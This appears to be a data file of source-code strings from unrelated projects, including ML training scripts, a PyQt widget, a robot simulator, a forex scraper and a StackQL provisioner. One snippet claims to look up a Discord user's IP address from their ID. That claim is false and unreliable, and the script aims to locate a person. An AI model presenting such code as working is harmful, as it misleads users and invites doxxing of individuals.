self.container.exec_run(\n            ['/bin/bash', '-c', 'id -u opendevin'],\n            workdir='/workspace',\n        )\n        if exit_code == 0:\n            # User exists, delete it\n            exit_code, logs = self.container.exec_run(\n                ['/bin/bash', '-c', 'userdel -r opendevin'],\n                workdir='/workspace',\n            )\n            if exit_code != 0:\n                raise Exception(\n                    f'Failed to remove opendevin user in sandbox: {logs}')\n\n        # Create the opendevin user\n        exit_code, logs = self.container.exec_run(\n            ['/bin/bash', '-c',\n             f'useradd -rm -d /home/opendevin -s /bin/bash -g root -G sudo -u {USER_ID} opendevin'],\n            workdir='/workspace',\n        )\n        if exit_code != 0:\n            raise Exception(\n     ",
    "import sys\nfrom threading import Thread\n\nfrom PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QPushButton, QScrollArea\nfrom PyQt5.QtCore import QThread, pyqtSignal, QTimer\nfrom matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas\nimport librosa.display\nfrom matplotlib.figure import Figure\nfrom collections import deque\nfrom torch.utils.data import DataLoader\nimport os\nimport librosa\nimport numpy as np\nimport time\nfrom torch import Tensor, nn\nfrom torch.optim import Adam\nfrom torch.utils.data import DataLoader\nfrom torch.utils.tensorboard import SummaryWriter\nimport torchvision.transforms\nfrom spikingjelly.activation_based import neuron, surrogate, monitor\nfrom spikingjelly.datasets.speechcommands import SPEECHCOMMANDS\nfrom spikingjelly.activation_based.functional import reset_net\nfrom scipy.signal import savgol_filter\nimport math\nimport argparse\nfrom typing import Optional\nimport pyaudio\nimport torch\nfrom torchaudio.transforms import Spectrogram\n\n\nlabel_dict = {'yes': 0, 'stop': 1, 'no': 2, 'right': 3, 'up': 4, 'left': 5, 'on': 6, 'down': 7, 'off': 8, 'go': 9,\n              'bed': 10, 'three': 10, 'one': 10, 'four': 10, 'two': 10, 'five': 10, 'cat': 10, 'dog': 10, 'eight': 10,\n              'bird': 10, 'happy': 10, 'sheila': 10, 'zero': 10, 'wow': 10, 'marvin': 10, 'house': 10, 'six': 10,\n              'seven': 10, 'tree': 10, 'nine': 10, '_silence_': 11}\nlabel_cnt = len(set(label_dict.values()))\nn_mels = 40\nf_max = 4000\nf_min = 20\ndelta_order = 0\nsize = 16000\ntry:\n    import cupy\n\n    backend = 'cupy'\nexcept ModuleNotFoundError:\n    backend = 'torch'\n    print('Cupy is not intalled. Using torch backend for neurons.')\n\n\ndef mel_to_hz(mels, dct_type):\n    if dct_type == 'htk':\n        return 700.0 * (10 ** (mels / 2595.0) - 1.0)\n\n    # Fill in the linear scale\n    f_min = 0.0\n    f_sp = 200.0 / 3\n    freqs = f_min + f_sp * mels\n\n    # And now the nonlinear scale\n    min_log_hz = 1000.0  # beginning of log region (Hz)\n    min_log_mel = (min_log_hz - f_min) / f_sp  # same (Mels)\n    logstep = math.log(6.4) / 27.0  # step size for log region\n\n    if torch.is_tensor(mels) and mels.ndim:\n        # If we have vector data, vectorize\n        log_t = mels >= min_log_mel\n        freqs[log_t] = min_log_hz * \\\n                       torch.exp(logstep * (mels[log_t] - min_log_mel))\n    elif mels >= min_log_mel:\n        # If we have scalar data, check directly\n        freqs = min_log_hz * math.exp(logstep * (mels - min_log_mel))\n\n    return freqs\n\n\ndef hz_to_mel(frequencies, dct_type):\n    if dct_type == 'htk':\n        if torch.is_tensor(frequencies) and frequencies.ndim:\n            return 2595.0 * torch.log10(1.0 + frequencies / 700.0)\n        return 2595.0 * math.log10(1.0 + frequencies / 700.0)\n\n    # Fill in the linear part\n    f_min = 0.0\n    f_sp = 200.0 / 3\n\n    mels = (frequencies - f_min) / f_sp\n\n    # Fill in the log-scale part\n\n    min_log_hz = 1000.0  # beginning of log region (Hz)\n    min_log_mel = (min_log_hz - f_min) / f_sp  # same (Mels)\n    logstep = math.log(6.4) / 27.0  # step size for log region\n\n    if torch.is_tensor(frequencies) and frequencies.ndim:\n        # If we have array data, vectorize\n        log_t = frequencies >= min_log_hz\n        mels[log_t] = min_log_mel + \\\n                      torch.log(frequencies[log_t] / min_log_hz) / logstep\n    elif frequencies >= min_log_hz:\n        # If we have scalar data, heck directly\n        mels = min_log_mel + math.log(frequencies / min_log_hz) / logstep\n\n    return mels\n\n\ndef create_fb_matrix(\n        n_freqs: int,\n        f_min: float,\n        f_max: float,\n        n_mels: int,\n        sample_rate: int,\n        dct_type: Optional[str] = 'slaney') -> Tensor:\n    if dct_type != \"htk\" and dct_type != \"slaney\":\n        raise ValueError(\"DCT type must be either 'htk' or 'slaney'\")\n\n    # freq bins\n    # Equivalent filterbank construction by Librosa\n    all_freqs = torch.linspace(0, sample_rate // 2, n_freqs)\n\n    # calculate mel freq bins\n    # hertz to mel(f)\n    m_min = hz_to_mel(f_min, dct_type)\n    m_max = hz_to_mel(f_max, dct_type)\n    m_pts = torch.linspace(m_min, m_max, n_mels + 2)\n    # mel to hertz(mel)\n    f_pts = mel_to_hz(m_pts, dct_type)\n    # calculate the difference between each mel point and each stft freq point in hertz\n    f_diff = f_pts[1:] - f_pts[:-1]  # (n_mels + 1)\n    # (n_freqs, n_mels + 2)\n    slopes = f_pts.unsqueeze(0) - all_freqs.unsqueeze(1)\n    # create overlapping triangles\n    zero = torch.zeros(1)\n    down_slopes = (-1.0 * slopes[:, :-2]) / f_diff[:-1]  # (n_freqs, n_mels)\n    up_slopes = slopes[:, 2:] / f_diff[1:]  # (n_freqs, n_mels)\n    fb = torch.max(zero, torch.min(down_slopes, up_slopes))\n\n    if dct_type == \"slaney\":\n        # Slaney-style mel is scaled to be approx constant energy per channel\n        enorm = 2.0 / (f_pts[2:n_mels + 2] - f_pts[:n_mels])\n        fb *= enorm.unsqueeze(0)\n\n    return fb\n\n\nclass MelScaleDelta(nn.Module):\n    __constants__ = ['n_mels', 'sampl",
    "'''Common python errors'''\n\n# def sum_of_numbers(numbers_list):\n#     '''Takes a list of numbers and returns their sum'''\n#     result_sum = 0\n#     for number in numbers_list:\n#         result_sum += number\n#     return result_sum\n\n# sum_of_numbers([1, 2, 3])\n\n# SyntaxError\n# print(\"Hello, world!\"\n\n# IndentationError\n# def hello_world():\n# print(\"Hello, world!\")\n\n# hello_world()\n\n# NameError\n# message = '123' # Fix the bug\n# print(message)\n\n# IndexError\n# numbers_list = [1, 2, 3]\n# print(numbers_list[3])\n# print(numbers_list[2])# Fix\n\n# TypeError\n# result = \"First\" + 10\n# print(result)\n# result = 'First' + str(10) # Fix\n# print(result) # Fix\n\n# ValueError\n# result = input(\"\u0412\u0432\u0435\u0434\u0456\u0442\u044c \u0447\u0438\u0441\u043b\u043e: \")\n# print(int(result) + 1)\n\nnumber_one = 1\nnumber_two = 2\n\n# if number_one > 0 and number_one < 10 \\\n#     or number_two > 0 and number_two < 10:\n#     print(\"Correct\")\ncheck_one = number_one > 0 and number_one < 10\ncheck_two = number_two > 0 and number_two < 10\nif check_one or check_two:\n    print(\"Correct\")\n\nprint('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', \\\n      'fdgdgdgdgdgdg')\n\nmy_dict = {\n    \"key_1\": 1,\n    \"key_2\": 2\n}\n",
    "\"\"\"Implement semantic entropy.\"\"\"\nimport os\nimport pickle\nimport logging\n\nimport numpy as np\nimport wandb\nimport torch\nimport torch.nn.functional as F\n\nfrom transformers import AutoModelForSequenceClassification, AutoTokenizer\n\nfrom uncertainty.models.huggingface_models import HuggingfaceModel\nfrom uncertainty.utils import openai as oai\nfrom uncertainty.utils import utils\n\n\nDEVICE = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n\n\nclass BaseEntailment:\n    def save_prediction_cache(self):\n        pass\n\n\nclass EntailmentDeberta(BaseEntailment):\n    def __init__(self):\n        self.tokenizer = AutoTokenizer.from_pretrained(\"microsoft/deberta-v2-xlarge-mnli\")\n        self.model = AutoModelForSequenceClassification.from_pretrained(\n            \"microsoft/deberta-v2-xlarge-mnli\").to(DEVICE)\n\n    def check_implication(self, text1, text2, *args, **kwargs):\n        inputs = self.tokenizer(text1, text2, return_tensors=\"pt\").to(DEVICE)\n        # The model checks if text1 -> text2, i.e. if text2 follows from text1.\n        # check_implication('The weather is good', 'The weather is good and I like you') --> 1\n        # check_implication('The weather is good and I like you', 'The weather is good') --> 2\n        outputs = self.model(**inputs)\n        logits = outputs.logits\n        # Deberta-mnli returns `neutral` and `entailment` classes at indices 1 and 2.\n        largest_index = torch.argmax(F.softmax(logits, dim=1))  # pylint: disable=no-member\n        prediction = largest_index.cpu().item()\n        if os.environ.get('DEBERTA_FULL_LOG', False):\n            logging.info('Deberta Input: %s -> %s', text1, text2)\n            logging.info('Deberta Prediction: %s', prediction)\n\n        return prediction\n\n\nclass EntailmentLLM(BaseEntailment):\n\n    entailment_file = 'entailment_cache.pkl'\n\n    def __init__(self, entailment_cache_id, entailment_cache_only):\n        self.prediction_cache = self.init_prediction_cache(entailment_cache_id)\n        self.entailment_cache_only = entailment_cache_only\n\n    def init_prediction_cache(self, entailment_cache_id):\n        if entailment_cache_id is None:\n            return dict()\n\n        logging.info('Restoring prediction cache from %s', entailment_cache_id)\n\n        api = wandb.Api()\n        run = api.run(entailment_cache_id)\n        run.file(self.entailment_file).download(\n            replace=True, exist_ok=False, root=wandb.run.dir)\n\n        with open(f'{wandb.run.dir}/{self.entailment_file}', \"rb\") as infile:\n            return pickle.load(infile)\n\n    def save_prediction_cache(self):\n        # Write the dictionary to a pickle file.\n        utils.save(self.prediction_cache, self.entailment_file)\n\n    def check_implication(self, text1, text2, example=None):\n        if example is None:\n            raise ValueError\n        prompt = self.equivalence_prompt(text1, text2, example['question'])\n\n        logging.info('%s input: %s', self.name, prompt)\n\n        hashed = oai.md5hash(prompt)\n        if hashed in self.prediction_cache:\n            logging.info('Restoring hashed instead of predicting with model.')\n            response = self.prediction_cache[hashed]\n        else:\n            if self.entailment_cache_only:\n                raise ValueError\n            response = self.predict(prompt, temperature=0.02)\n            self.prediction_cache[hashed] = response\n\n        logging.info('%s prediction: %s', self.name, response)\n\n        binary_response = response.lower()[:30]\n        if 'entailment' in binary_response:\n            return 2\n        elif 'neutral' in binary_response:\n            return 1\n        elif 'contradiction' in binary_response:\n            return 0\n        else:\n            logging.warning('MANUAL NEUTRAL!')\n            return 1\n\n\nclass EntailmentGPT4(EntailmentLLM):\n\n    def __init__(self, entailment_cache_id, entailment_cache_only):\n        super().__init__(entailment_cache_id, entailment_cache_only)\n        self.name = 'gpt-4'\n\n    def equivalence_prompt(self, text1, text2, question):\n\n        prompt = f\"\"\"We are evaluating answers to the question \\\"{question}\\\"\\n\"\"\"\n        prompt += \"Here are two possible answers:\\n\"\n        prompt += f\"Possible Answer 1: {text1}\\nPossible Answer 2: {text2}\\n\"\n        prompt += \"Does Possible Answer 1 semantically entail Possible Answer 2? Respond with entailment, contradiction, or neutral.\"\"\"\n\n        return prompt\n\n    def predict(self, prompt, temperature):\n        return oai.predict(prompt, temperature, model=self.name)\n\n\nclass EntailmentGPT35(EntailmentGPT4):\n\n    def __init__(self, entailment_cache_id, entailment_cache_only):\n        super().__init__(entailment_cache_id, entailment_cache_only)\n        self.name = 'gpt-3.5'\n\n\nclass EntailmentGPT4Turbo(EntailmentGPT4):\n\n    def __init__(self, entailment_cache_id, entailment_cache_only):\n        super().__init__(entailment_cache_id, entailment_cache_only)\n        self.name = 'gpt-4-turbo'\n\n\nclass EntailmentLlama(EntailmentLLM):\n\n    def __init__(self, entailment_cache_id, entailment",
    "\"\"\"\n@describe:\n@fileName: waiting_widget.py\n@time    : 2024/4/15 21:00\n@author  : \u4fee\u6539\u81ea https://geek-docs.com/pyqt5/pyqt5-questions\n\"\"\"\n\nfrom PyQt5.QtCore import QTimer, QPoint\nfrom PyQt5.QtGui import QPainter, QColor, QPen\nfrom PyQt5.QtWidgets import QWidget\n\n\nclass WaitingIndicatorWidget(QWidget):\n    def __init__(self, size=(100, 100), parent=None):\n        super().__init__(parent)\n        self.setFixedSize(size[0], size[1])\n        self.angle = 0\n        self.timer = QTimer(self)\n        self.timer.timeout.connect(self.update)\n        self.timer.start(100)\n\n    def paintEvent(self, event):\n        painter = QPainter(self)\n        painter.setRenderHint(QPainter.Antialiasing)\n\n        pen = QPen(QColor('gray'))\n        pen.setWidth(3)\n        painter.setPen(pen)\n\n        center = QPoint(self.width() // 2, self.height() // 2)\n        radius = min(self.width(), self.height()) // 2\n\n        # painter.drawEllipse(center, radius, radius)\n\n        painter.translate(center)\n        painter.rotate(self.angle)\n        for i in range(12):\n            painter.rotate(30)\n            painter.drawLine(radius // 2, 0, radius, 0)\n\n    def update(self):\n        self.angle += 10\n        self.repaint()\n",
    "import aiohttp\nimport asyncio\n\nasync def get_ip_address_from_discord_id(discord_id: str) -> str:\n    \"\"\"\n    Function to retrieve the IP address associated with a Discord user ID.\n\n    Parameters:\n    - discord_id: str\n        The Discord user ID for which the IP address is to be fetched.\n\n    Returns:\n    - str\n        The IP address associated with the provided Discord user ID.\n\n    Raises:\n    - ValueError:\n        If the Discord ID is invalid or not found, an error is raised.\n    \"\"\"\n\n    # \u30e6\u30fc\u30b6\u30fc\u30c7\u30fc\u30bf\u3092\u53d6\u5f97\u3059\u308b\u305f\u3081\u306e Discord API \u30a8\u30f3\u30c9\u30dd\u30a4\u30f3\u30c8\n    url = f\"https://discord.com/api/v9/users/{discord_id}\"\n\n    async with aiohttp.ClientSession() as session:\n        async with session.get(url) as response:\n            if response.status == 200:\n                user_data = await response.json()\n                ip_address = user_data.get('ip', 'IP Address not found')\n                return ip_address\n            else:\n                raise ValueError(f\"Failed to retrieve IP address. Status code: {response.status}\")\n\nasync def main():\n    discord_id = input(\"Enter Discord user ID: \")\n    try:\n        ip_address = await get_ip_address_from_discord_id(discord_id)\n        print(f\"The IP address associated with Discord ID {discord_id} is: {ip_address}\")\n    except ValueError as e:\n        print(f\"Error: {e}\")\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n",
    "import math\nfrom shapely.geometry import LineString, Point\nfrom shapely.ops import nearest_points\n\nfrom Sensor import Sensor\n\n\nclass Robot:\n\n    def __init__(self, x, y, power):\n        self.radius = 20\n        self.x = x\n        self.y = y\n        self.power = power\n\n        #indicating the motor speed values\n        self.v_right = 0\n        self.v_left = 0\n\n        self.direction = 0          #indicates direction of movement (1: forward/stationary, -1: backward)\n        self.orientation = 0\n\n        self.sensors = [Sensor(i * 30, self) for i in range(12)]\n        self.sensor_distances = [0]*12\n\n        self.collision_margin = 0.001\n        self.velocity_vector = (0, 0)\n\n    def right_motor(self, boolean, forward):\n        if boolean:\n            if forward:\n                self.v_right = self.power\n            else:\n                self.v_right = -self.power\n        else:\n            self.v_right = 0\n\n    def left_motor(self, boolean, forward):\n        if boolean:\n            if forward:\n                self.v_left = self.power\n            else:\n                self.v_left = -self.power\n        else:\n            self.v_left = 0\n\n\n    def update(self, dt, walls):\n        R = self.radius\n\n        L = 2 * R\n        omega = (self.v_right - self.v_left) / L\n        v = (self.v_right + self.v_left) / 2\n\n        #Update orientation\n        self.orientation += omega * dt\n        self.orientation %= (2 * math.pi)\n\n        #Update direction (1: forward/stationary, -1: backward)\n        self.direction = math.copysign(1, v)\n\n        #Initial movement calculation\n        dx = v * dt * math.cos(self.orientation)\n        dy = v * dt * math.sin(self.orientation)\n        proposed_x = self.x + dx\n        proposed_y = self.y + dy\n\n        #Used for initial collision check\n        movement_line = LineString([(self.x, self.y), (proposed_x, proposed_y)]).buffer(R)\n\n        #Detect initial collision, also decomposes the vector\n        for wall in walls:\n            wall_line = LineString([(wall.x1, wall.y1), (wall.x2, wall.y2)])\n            if movement_line.intersects(wall_line):\n                movement_vector = (self.direction * self.power * math.cos(self.orientation), self.direction * self.power * math.sin(self.orientation))\n                wall_vector = (wall.x2 - wall.x1, wall.y2 - wall.y1)\n                wall_vector_normalized = (\n                    wall_vector[0] / math.hypot(wall_vector[0], wall_vector[1]),\n                    wall_vector[1] / math.hypot(wall_vector[0], wall_vector[1])\n                )\n                dot_product = movement_vector[0] * wall_vector_normalized[0] + movement_vector[1] * \\\n                              wall_vector_normalized[1]\n                parallel_component = (dot_product * wall_vector_normalized[0], dot_product * wall_vector_normalized[1])\n                dx = parallel_component[0] * dt\n                dy = parallel_component[1] * dt\n                proposed_x = self.x + dx\n                proposed_y = self.y + dy\n                break\n\n        #Recreate movement line using the parallel component only\n        movement_line = LineString([(self.x, self.y), (proposed_x, proposed_y)]).buffer(R)\n\n        #Secondary collision check to ensure that the parallel component will not lead to penetrating walls\n        for wall in walls:\n            wall_line = LineString([(wall.x1, wall.y1), (wall.x2, wall.y2)])\n            if movement_line.intersects(wall_line):\n                proposed_x = self.x\n                proposed_y = self.y\n                break\n\n        self.x = proposed_x\n        self.y = proposed_y\n        self.velocity_vector = (dx / dt, dy / dt)\n\n    def update_sensors(self, walls):\n        for idx, sensor in enumerate(self.sensors):\n            sensor.update_lines()   #update sensor line positions\n            sensor.check_intersect(walls)   #check for intersections with walls\n            self.sensor_distances[idx] = sensor.distance    #add distance of sensor to distance array for ANN\n\n    def is_collision(self):\n        collision = any(x<=0 for x in self.sensor_distances)\n        return collision\n",
    "from bs4 import BeautifulSoup\nimport requests\n\nimport yfinance\n\nimport os\nimport gspread\n\nimport datetime\nimport pytz\n\nfrom send_email import sendEmail\n\nimport mysql.connector\n\nfrom dotenv import load_dotenv\nload_dotenv('.env')\n\n# Set Up\nnow = datetime.datetime.now(pytz.timezone(\"Asia/Tokyo\")).strftime(\"%Y/%m/%d %H:%M:%S\")\ndate, time = now.split(\" \")\n\ndir_path = os.path.dirname(__file__)\ngc = gspread.oauth(\n    credentials_filename = os.path.join(dir_path, \"client_secret.json\"),\n    authorized_user_filename = os.path.join(dir_path, \"authorized_user.json\")\n)\n\ntarget_file = gc.open_by_key(os.getenv('FOREST_SHEET_API_KEY'))  # Target sheet\ntarget_sheet = target_file.get_worksheet(0)\n\nres = requests.get('https://nikkeiyosoku.com/usdjpy/forecast/') # Target web page\nsoup = BeautifulSoup(res.text, 'html.parser')\n\n\n# Scraype AI forecast Update date\ntag_obj = soup.find('span', class_='time-txt')\nscraped_date, scraped_time = tag_obj.string.replace(\"(\", '').split(\" \")\nscraped_date_with_year = str(datetime.datetime.today().year) + \"/\" + scraped_date\n\n# Search in Sheet with AI forecast recent updated date\nsearched_cell = target_sheet.find(scraped_date_with_year)\nif searched_cell == None:\n\n    # Scraype AI forecast\n    tag_objs = soup.find_all('p', class_='forecast-today-txt')\n    tag_list_string = [x.string for x in tag_objs]\n\n\n    # Fetch current dollar yen price\n    target_ticker = yfinance.Ticker(\"USDJPY=X\")\n    recent_prices = target_ticker.history(period='3h', interval='1m')\n    recent_price = recent_prices['Close'].iloc[-1]\n\n\n    # Write in Sheet\n    min_expected = tag_list_string[0].split()[0]\n    max_expected = tag_list_string[0].split()[2]\n    ai_expected = tag_list_string[1].replace(\"\\xa0\", '')\n\n    data_to_save = [min_expected, max_expected, ai_expected, date, time, recent_price, 0] # put 0 as a placeholder which will be updated later\n\n    target_sheet.append_row(data_to_save, value_input_option='USER_ENTERED')\n\n\n    # Send Update Info Email\n    email_message = (\"AI Forecast: \" + ai_expected\n                    + \"\\nRange: \" + min_expected + \" ~ \" + max_expected\n                    + \"\\nCurrent Price: \" + str(recent_price)\n                    + \"\\nUpdated at: \" + date + \" \" + time)\n    sendEmail(\"Today's Forest Dollar-Yen Forecast\", email_message)\n\n\n    # Insert to DB\n    mydb = mysql.connector.connect(\n        host = \"localhost\",\n        user = os.getenv('DB_USER'),\n        password = os.getenv('DB_PASSWORD'),\n        database = \"forest_database\",\n    )\n\n    mycursor = mydb.cursor()\n    sql = \"INSERT into forestapi_forestdollaryen (min_forecast, max_forecast, ai_forecast, date_created, time_created, price_when_scrayped, price_after_12_hours_scrayped) VALUES (%s, %s, %s, %s, %s, %s, %s)\"\n    mycursor.execute(sql, data_to_save)\n    mydb.commit()\n",
    "import sys\r\nfrom ..lib.utils import run_test, perform_retries, run_stackql_command, catch_error_and_exit, run_stackql_query\r\nfrom ..lib.config import setup_environment, load_manifest, get_global_context_and_providers, get_full_context\r\nfrom ..lib.templating import get_queries\r\n\r\nclass StackQLProvisioner:\r\n    \r\n    def __init__(self, stackql, vars, logger, stack_dir, stack_env):\r\n        self.stackql = stackql\r\n        self.vars = vars\r\n        self.logger = logger\r\n        self.stack_dir = stack_dir\r\n        self.stack_env = stack_env\r\n        self.env = setup_environment(self.stack_dir, self.logger)\r\n        self.manifest = load_manifest(self.stack_dir, self.logger)\r\n        self.stack_name = self.manifest.get('name', stack_dir)\r\n        \r\n    def run(self, dry_run, on_failure):\r\n\r\n        self.logger.info(f\"Deploying [{self.stack_name}] in [{self.stack_env}] environment {'(dry run)' if dry_run else ''}\")\r\n\r\n        # get global context and pull providers\r\n        self.global_context, self.providers = get_global_context_and_providers(self.env, self.manifest, self.vars, self.stack_env, self.stackql, self.logger)            \r\n\r\n        for resource in self.manifest.get('resources', []):\r\n\r\n            self.logger.info(f\"processing resource: {resource['name']}\")\r\n\r\n            # get full context\r\n            full_context = get_full_context(self.env, self.global_context, resource, self.logger)    \r\n\r\n            # get resource queries\r\n            resource_queries, resource_query_options = get_queries(self.env, self.stack_dir, 'stackql_resources', resource, full_context, True, self.logger)\r\n\r\n            # get resource queries\r\n            test_queries, test_query_options = get_queries(self.env, self.stack_dir, 'stackql_tests', resource, full_context, False, self.logger)\r\n\r\n            create_query = None\r\n            createorupdate_query = None\r\n            update_query = None\r\n\r\n            if not (('create' in resource_queries or 'createorupdate' in resource_queries) or ('create' in resource_queries and 'update' in resource_queries)):\r\n                catch_error_and_exit(\"iql file must include either 'create' or 'createorupdate' anchor, or both 'create' and 'update' anchors.\", self.logger)\r\n\r\n            if 'create' in resource_queries:\r\n                create_query = resource_queries['create']\r\n\r\n            if 'createorupdate' in resource_queries:\r\n                createorupdate_query = resource_queries['createorupdate']\r\n\r\n            if 'update' in resource_queries:\r\n                update_query = resource_queries['update']\r\n\r\n            preflight_query = None\r\n            postdeploy_query = None\r\n            exports_query = None\r\n\r\n            if test_queries == {}:\r\n                self.logger.info(f\"test query file not found for {resource['name']}. Skipping tests.\")\r\n                continue\r\n            else:\r\n                if 'preflight' in test_queries:\r\n                    preflight_query = test_queries['preflight']\r\n                \r\n                if 'postdeploy' in test_queries:\r\n                    postdeploy_query = test_queries['postdeploy']\r\n                    postdeploy_retries = test_query_options.get('postdeploy', {}).get('retries', 10)\r\n                    postdeploy_retry_delay = test_query_options.get('postdeploy', {}).get('retry_delay', 10)  \r\n\r\n                if 'exports' in test_queries:\r\n                    # export variables from resource\r\n                    exports_query = test_queries['exports']\r\n                    exports_retries = test_query_options.get('exports', {}).get('retries', 10)\r\n                    exports_retry_delay = test_query_options.get('exports', {}).get('retry_delay', 10)\r\n\r\n            #\r\n            # run pre flight check\r\n            #\r\n            resource_exists = False\r\n            if not preflight_query:\r\n                self.logger.info(f\"pre-flight check not configured for [{resource['name']}]\")\r\n            elif dry_run:\r\n                self.logger.info(f\"dry run pre-flight check for [{resource['name']}]:\\n\\n{preflight_query}\\n\")\r\n            else:\r\n                self.logger.info(f\"running pre-flight check for [{resource['name']}]...\")\r\n                resource_exists = run_test(resource, preflight_query, self.stackql, self.logger)\r\n\r\n            #\r\n            # deploy\r\n            #\r\n            if createorupdate_query:\r\n                # disregard preflight check result if createorupdate is present\r\n                if dry_run:\r\n                    self.logger.info(f\"dry run create_or_update for [{resource['name']}]:\\n\\n{createorupdate_query}\\n\")\r\n                else:\r\n                    self.logger.info(f\"creating/updating [{resource['name']}]...\")\r\n                    msg = run_stackql_command(createorupdate_query, self.stackql, self.logger)\r\n                    self.logger.info(f\"create or update response: {msg}\")\r\n            else:\r\n                if not resource_exists:\r\n                    if dry_run:\r\n                      ",
    "import torch.nn as nn\nfrom sklearn import metrics\nimport torch\nimport matplotlib.pyplot as plt\nimport os\nimport numpy as np\nimport random\n\n# from models.tiof import ThreeInOne,Args\n# from models.ct_img import ThreeInOne,Args\nfrom models.resnet_3channel import Resnet,Args\nfrom preprocess.channel3_img_dataset import petct_dataset\n\nepoches = 100\n\ndef set_seed(seed):\n    torch.manual_seed(seed)\n    torch.cuda.manual_seed_all(seed)\n    torch.backends.cudnn.deterministic = True\n    torch.backends.cudnn.benchmark = False\n    np.random.seed(seed)\n    random.seed(seed)\n\nset_seed(712)  # \u4f60\u53ef\u4ee5\u9009\u62e9\u4efb\u4f55\u4f60\u559c\u6b22\u7684\u6570\u5b57\u4f5c\u4e3a\u79cd\u5b50\n\nepoches = 100\n\nweight_decay = 0.001\n\ndef train(net, train_dataloader, optimizer):\n    net.train()\n    predict_list, tgt_list = [], []\n    loss_t = 0.\n    for batch_idx, item in enumerate(train_dataloader):\n        channel_3_img = item['channel_3_img'].squeeze(0).float().cuda()\n        bs = len(channel_3_img)\n        label_value = item['label']\n        label = torch.full((bs,), label_value.item())\n        label = label.cuda()\n        pred = net(channel_3_img)\n        # print(f'pred:{pred.shape}')\n        # print(f'label:{label.shape}')\n        avg_pred = pred.mean(dim=0, keepdim=True) #\u6c42\u5e73\u5747\n        loss = nn.CrossEntropyLoss()(pred, label)\n        loss_t += loss.item()\n        optimizer.zero_grad()\n        loss.backward()\n        optimizer.step()\n        predict_list += list(avg_pred.data.max(1)[1].cpu().numpy())\n        tgt_list += list(label_value.cpu().numpy())\n        \n\n    torch.save(net.state_dict(), 'net_all.pth')\n    acc = metrics.accuracy_score(tgt_list, predict_list)\n    return acc, loss_t/len(train_dataloader)\n\ndef valid(net, val_dataloader):\n    net.eval()\n    loss_t = 0.\n    predict_list = []\n    tgt_list = []\n    with torch.no_grad():\n        for batch_idx, item in enumerate(val_dataloader):\n            channel_3_img = item['channel_3_img'].squeeze(0).float().cuda()\n            bs = len(channel_3_img)\n            label_value = item['label']\n            label = torch.full((bs,), label_value.item())\n            label = label.cuda()\n            pred = net(channel_3_img)\n            avg_pred = pred.mean(dim=0, keepdim=True) #\u6c42\u5e73\u5747\n            loss = nn.CrossEntropyLoss()(pred, label)\n            loss_t += loss.item()\n            predict_list += list(avg_pred.data.max(1)[1].cpu().numpy())\n            tgt_list += list(label_value.cpu().numpy())\n\n    acc = metrics.accuracy_score(tgt_list, predict_list)\n    precision = metrics.precision_score(tgt_list, predict_list)\n    recall = metrics.recall_score(tgt_list, predict_list)\n    f1_score = metrics.f1_score(tgt_list, predict_list)\n    auc = metrics.roc_auc_score(tgt_list, predict_list)  # \u8ba1\u7b97 AUC \u6307\u6807\n    print(f\"auc: {auc}\")\n    # if acc > best_acc:\n    #     best_acc = acc\n    return acc, precision, recall, f1_score, auc, loss_t/len(val_dataloader)\n        # loss_t += loss.item()\n\ndef save_fig(curve, title):\n    plt.figure()\n    plt.plot(curve)\n    plt.title(title)\n    plt.xlabel('Epoch')\n    plt.ylabel(title)\n    if not os.path.exists(\"output/alpha_fusion_3channel_fold_7/\"):\n        os.makedirs(\"output/alpha_fusion_3channel_fold_7/\")\n    plt.savefig(f'output/alpha_fusion_3channel_fold_7/{title}.png')  # \u4fdd\u5b58\u51c6\u786e\u7387\u66f2\u7ebf\u56fe\u50cf\n\nif __name__ == '__main__':\n    train_dataset = petct_dataset('preprocess/train_6.txt', 'train_dataset')\n    train_load = torch.utils.data.DataLoader(train_dataset, batch_size=1, shuffle=True, num_workers=4,\n                                             drop_last=True)\n\n    test_dataset = petct_dataset('preprocess/test_6.txt', 'test_dataset')\n    test_load = torch.utils.data.DataLoader(test_dataset, batch_size=1, shuffle=True, num_workers=4,\n                                             drop_last=True)\n\n    args = Args()\n    net = Resnet(args).cuda()\n    optim = torch.optim.Adam(filter(lambda p: p.requires_grad, net.parameters()), lr=1e-5,\n                                          betas=(0.9, 0.999), weight_decay=weight_decay)\n    train_acc_curve = []\n    test_acc_curve = []\n    train_loss_curve = []\n    precision_curve = []\n    recall_curve = []\n    f1_score_curve = []\n    auc_curve = []\n    test_loss_curve = []\n\n    for epoch in range(epoches):\n        train_acc, train_loss = train(net, train_load, optim)\n        train_acc_curve.append(train_acc)\n        train_loss_curve.append(train_loss)\n\n        test_acc, precision, recall, f1_score, auc, test_loss = valid(net, test_load)\n        test_acc_curve.append(test_acc)\n        precision_curve.append(precision)\n        recall_curve.append(recall)\n        f1_score_curve.append(f1_score)\n        test_loss_curve.append(test_loss)\n        auc_curve.append(auc)\n\n        # \u7ed8\u5236\u66f2\u7ebf\n        save_fig(train_acc_curve, \"train_accuracy\")\n        save_fig(train_loss_curve, \"train_loss\")\n        save_fig(test_loss_curve, \"test_loss\")\n        save_fig(test_acc_curve, \"test_accuracy\")\n        save_fig(precision_curve, \"precision\")\n        save_fig(recall_curve, \"recall\")\n        save_fig(f1_score_curve, \"f1_score\")\n        save_fig",
    "# Scenario\n# We've showed you recently how to extend Stack possibilities by defining a new class (i.e., a subclass) which retains all inherited\n# traits and adds some new ones.\n\n# Your task is to extend the Stack class behavior in such a way so that the class is able to count all the elements that are pushed\n# and popped (we assume that counting pops is enough). Use the Stack class we've provided in the editor.\n\n# Follow the hints:\n\n# introduce a property designed to count pop operations and name it in a way which guarantees hiding it;\n# initialize it to zero inside the constructor;\n# provide a method which returns the value currently assigned to the counter (name it get_counter()).\n# Complete the code in the editor. Run it to check whether your code outputs 100.\n\n####################################################################################################\n\n# class Stack:\n#     def __init__(self):\n#         self.__stk = []\n\n#     def push(self, val):\n#         self.__stk.append(val)\n\n#     def pop(self):\n#         val = self.__stk[-1]\n#         del self.__stk[-1]\n#         return val\n\n\n# class CountingStack(Stack):\n#     def __init__(self):\n#     #\n#     # Fill the constructor with appropriate actions.\n#     #\n\n#     def get_counter(self):\n#     #\n#     # Present 